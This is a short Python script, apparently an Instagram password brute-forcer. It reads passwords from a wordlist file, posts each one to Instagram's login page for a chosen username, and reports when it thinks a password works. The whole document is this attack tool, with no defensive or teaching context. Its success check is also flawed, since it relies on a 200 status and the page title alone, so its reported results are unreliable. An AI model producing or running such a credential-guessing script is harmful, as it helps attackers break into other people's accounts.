#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup

def instagram_password_cracker(username, wordlist_file):
    with open(wordlist_file, 'r') as file:
        passwords = file.read().splitlines()

    session = requests.Session()

    for password in passwords:
        login_url = 'https://www.instagram.com/accounts/login/'
        login_data = {
            'username': username,
            'password': password
        }

        response = session.post(login_url, data=login_data)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup.find('title').text == 'Instagram':
                print(f"Password found: {password}")
                return
            else:
                print(f"Incorrect password: {password}")

    print("Password not found in the wordlist.")

# Example usage
username = 'your_instagram_username'
wordlist_file = 'wordlist.txt'

instagram_password_cracker(username, wordlist_file)